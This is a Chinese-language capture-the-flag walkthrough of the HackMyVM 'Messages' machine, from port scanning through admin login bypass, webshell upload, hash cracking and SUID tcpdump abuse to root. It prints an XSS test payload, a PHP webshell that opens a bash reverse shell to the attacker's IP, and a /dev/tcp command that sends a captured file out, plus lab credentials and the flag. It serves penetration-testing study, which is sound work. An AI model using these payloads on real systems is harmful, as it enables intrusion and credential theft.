> 靶机地址：https://hackmyvm.eu/machines/machine.php?vm=Messages

### 环境准备

vmware kali  桥接

virutalbox messages 桥接

![image-20240223151245703](imgs/image-20240223151245703.png)

### nmap扫描

简单端口扫描

```bash
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 172.168.102.66
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-23 02:00 EST
Nmap scan report for 172.168.102.66
Host is up (0.00040s latency).
Not shown: 65525 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap
443/tcp open  https
465/tcp open  smtps
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s

Nmap done: 1 IP address (1 host up) scanned in 13.59 seconds
```

详细信息扫描

```bash
┌──(kali㉿kali)-[~]                                                             
└─$ sudo nmap -sT -sV -O -p22,25,80,110,143,465,587,993,995,443 172.168.102.66  
sudo: unable to resolve host kali: Temporary failure in name resolution         
[sudo] password for kali:                                                       
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-23 02:17 EST                 
Nmap scan report for 172.168.102.66                                             
Host is up (0.00042s latency).                                                  
                                                                                
PORT    STATE SERVICE  VERSION                                                  
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5 (protocol 2.0)                    
25/tcp  open  smtp     Postfix smtpd                                            
80/tcp  open  http     nginx                                                    
110/tcp open  pop3     Dovecot pop3d                                            
143/tcp open  imap     Dovecot imapd                                            
443/tcp open  ssl/http nginx                                                    
465/tcp open  ssl/smtp Postfix smtpd                                           
587/tcp open  smtp     Postfix smtpd                                            
993/tcp open  imaps?                                                            
995/tcp open  pop3s?                                                            
MAC Address: 08:00:27:D8:C2:A6 (Oracle VirtualBox virtual NIC) 
Warning: OSScan results may be unreliable because we could not find at least 1 
pen and 1 closed port                                                           
Device type: general purpose                                                    
Running: Linux 4.X|5.X                                                          
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5                 
OS details: Linux 4.15 - 5.6, Linux 5.0 - 5.4                                   
Network Distance: 1 hop                                                         
Service Info: Hosts: -mx.messages.hmv,  mx.messages.hmv; OS: Linux; CPE: cpe:/o:
linux:linux_kernel                                                              
                                                                                
OS and Service detection performed. Please report any incorrect results at https
://nmap.org/submit/ .                                                           
Nmap done: 1 IP address (1 host up) scanned in 18.68 seconds 
```

nmap扫描没有什么有用的信息



### Web渗透

访问`80`端口

![image-20240223153528477](imgs/image-20240223153528477.png)

点击`Chatbot`，存在XSS漏洞

```js
<script>alert('sectest')</script>
```

![image-20240223153620427](imgs/image-20240223153620427.png)

访问`Webmail`是一个登录框，使用`万能用户名`测试，不存在SQL注入

#### 目录扫描

```bash
 dirb https://172.168.102.66/chatbot/
```



![image-20240223153849179](imgs/image-20240223153849179.png)



发现`/chatbot/admin/`也是一个登录界面，使用万能用户名登录成功！



![image-20240223153956419](imgs/image-20240223153956419.png)

![image-20240223154045977](imgs/image-20240223154045977.png)

在`Settings`中找到上传文件的位置

![image-20240223154406238](imgs/image-20240223154406238.png)

直接上传php木马，并没有对上传的文件做检测

```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.168.102.69/4567 0>&1'"); ?>
```

上传以后，kali监听端口，找到能够触发刚刚上传的木马的位置，点击，反弹shell

下图位置触发了反弹shell，我上传的是 `system logo`

![image-20240223154644468](imgs/image-20240223154644468.png)

![image-20240223154739490](imgs/image-20240223154739490.png)

#### 权限提升

反弹拿到的`shell`位置是在`/html/chatbot/uploads`，该位置没有有用的东西，返回上一级查看，找到一个`config.php`

![image-20240223155107355](imgs/image-20240223155107355.png)

`config.php`包含了三个文件,挨个查看

![image-20240223155349247](imgs/image-20240223155349247.png)



` initialize.php`文件中发现了数据库账号密码`chatbot:chatbot`

![image-20240223204243531](imgs/image-20240223204243531.png)



但是在连接Mysql的时候发现好像不太正常，没有正确显示

![image-20240223205045255](imgs/image-20240223205045255.png)

可以输入一下命令，再去连接MySQL，就可以成功！

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

![image-20240223205215211](imgs/image-20240223205215211.png)

在`vmail`库中的`mailbox`表中找到几个邮箱

![image-20240223205832645](imgs/image-20240223205832645.png)

密码都做了加密处理

`john`解密出`ruby@messages.hmv`邮箱的密码`Ruby.r123`

```bash
john passwd --wordlist=/usr/share/wordlists/rockyou.txt
```



![image-20240223210142636](imgs/image-20240223210142636.png)

网站去首页登录

![image-20240223210237597](imgs/image-20240223210237597.png)

![image-20240223210308735](imgs/image-20240223210308735.png)

发现了`root`发送的邮箱

![image-20240223210507798](imgs/image-20240223210507798.png)

![image-20240223210936714](imgs/image-20240223210936714.png)

找到私钥，保存到`id_rsa`里，赋予`600`权限，必须是`600`权限不能赋予过大

![image-20240223210855307](imgs/image-20240223210855307.png)

ssh连接`ruby`

> 靶机这里由于网络环境，ip发生变化

![image-20240223211053136](imgs/image-20240223211053136.png)

查看当前目录，并查看`suid`

![image-20240223211507655](imgs/image-20240223211507655.png)

发现可疑的`tcpdump`，监听本地回环网卡

```bash
/usr/bin/tcpdump -i lo -w saury.pcap
```

因为在前面了解到只能用`127.0.0.1`

![image-20240223213129579](imgs/image-20240223213129579.png)

运行后，等一会，然后`ctrl+c`结束抓包

![image-20240223211913735](imgs/image-20240223211913735.png)

完事后，将`saury.pcap`下载到kali本地上

kali监听 

```bash
nc -lvvp 4567 > saury.pcap
```

靶机上进行局域网传输

```bash
cat saury.pcap > /dev/tcp/192.168.1.103/4567
```

![image-20240223212207561](imgs/image-20240223212207561.png)

局域网传文件完成

![image-20240223212225044](imgs/image-20240223212225044.png)

这个时候可以用`wireshark`去分析`saury.pcap`，也可以用`string`命令字提取其中的字符串

```bash
strings saury.pcap | grep "user"
```



![image-20240223212519755](imgs/image-20240223212519755.png)

```bash
 strings saury.pcap | grep "pass"
```

![image-20240223212735196](imgs/image-20240223212735196.png)

`Th1$isR3411yS3cuRe`

![image-20240223212915745](imgs/image-20240223212915745.png)

`HMV{root:messages.hmv:5d3db63bba}`

